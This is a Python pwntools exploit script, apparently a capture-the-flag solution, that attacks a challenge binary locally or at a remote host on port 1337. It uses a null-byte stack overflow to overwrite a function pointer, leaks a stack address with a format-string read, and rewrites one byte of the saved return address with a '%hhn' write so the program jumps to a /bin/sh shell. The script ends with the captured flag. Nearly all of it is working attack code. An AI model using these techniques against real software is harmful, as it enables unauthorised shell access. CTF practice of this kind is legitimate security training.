#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

context.log_level = 'info'
context.os = 'linux'
context.bits = 64
context.arch = 'amd64'
context.endian = 'little'

###

if DEBUG:
    r = process('./1510917209.37_chall')
else:
    r = remote('ssi.gouv.fr', 1337)

GDB = False
if GDB and DEBUG:
    gdb.attach(r, '''b *0x555555554d07''')

r.recvuntil('id\n')
# we have a null byte overflow int the stack
# we overwrite the help function pointer
# after that, calling help will call function that verify credentials
r.sendline('a' * 16)
r.sendline('1')
# there is a format string bug in the username when credentials aren't correct
r.recvuntil('Username: ')
r.sendline('%70$p')
r.recvuntil('Password: ')
r.sendline('osef')
stack = int('0x' + r.recvline().split('0x')[1].rstrip(), 16)
# target is target RIP
target = stack - 0x18
log.info('stack: %#x' % stack)
log.info('target: %#x' % target)

r.sendline('1')
r.recvuntil('Username: ')
# Rewriting only one byte of target RIP to jump on execl("/bin/sh", NULL);
fmt = '%34c%24$hhnaaaaa' + p64(target)
r.sendline(fmt)
r.recvuntil('Password: ')
r.sendline('osef')
r.recvline()

r.interactive()
r.close()

# GH17{to0_m4ny_vulns_but_st1ll_w34k}
